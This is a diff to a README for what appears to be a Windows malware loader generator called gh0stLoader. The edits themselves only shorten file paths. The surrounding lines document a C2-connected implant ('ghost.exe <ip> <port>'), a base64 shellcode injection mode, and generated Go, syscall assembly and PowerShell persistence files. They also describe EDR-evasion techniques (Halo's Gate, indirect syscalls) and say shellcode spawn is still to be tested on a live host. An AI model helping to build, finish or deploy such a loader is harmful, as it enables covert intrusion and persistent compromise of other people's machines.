@@ -31,7 +31,7 @@ ghost.exe <ip> <port>         # override C2 seed at launch (argv)
 ghost.exe --op <ip> <port> "shellcode:<base64>"
 ```
 
-Dependencies: `python3` + `cryptography` (in `/root/globe/bin/venv`), and a Go
+Dependencies: `python3` + `cryptography` (in `.../bin/venv`), and a Go
 toolchain `>= 1.20` (crypto/ecdh) - validated with **go1.23.4 linux/amd64**
 cross-compiling to `windows/amd64`.
 
@@ -68,7 +68,7 @@ Constraints (non-negotiable):
 - Python 3 with the `cryptography` package. On this repo it is provided by the
   shared venv:
   ```
-  /root/globe/bin/venv/bin/python3 gh0stLoader01.py --help
+  .../bin/venv/bin/python3 gh0stLoader01.py --help
   ```
 - The generator writes 4 files into the **current working directory**:
   `main.go`, `syscalls_amd64.s`, `persist.ps1`, `go.mod`.
@@ -332,7 +332,7 @@ Verified in the build environment:
 - Assembly stubs assemble (plan9 register is named `DX`, not `RDX`).
 - Decoder simulated against real stub byte layouts (both B8 and 8B05 forms).
 - SSN plausible ranges cross-checked against the authoritative j00ru
-  `windows-syscalls` dataset (`/root/globe/ctx/windows-syscalls/x64/json/`).
+  `windows-syscalls` dataset (`.../ctx/windows-syscalls/x64/json/`).
 
 What still needs a live Windows host:
 - Actual syscall execution and successful shellcode spawn.
@@ -366,7 +366,7 @@ What still needs a live Windows host:
 ## 11. Files
 
 ```
-/root/globe/pjc/gh0stloader/
+.../pjc/gh0stloader/
   gh0stLoader00.py     v0.0 legacy generator (CTR mesh, 4-arg asm, dead DLL path)
   gh0stLoader01.py     v0.2 current generator (AES-GCM, per-arity stubs, Halo's Gate,
                        indirect-syscall injector, forward-secret mesh)
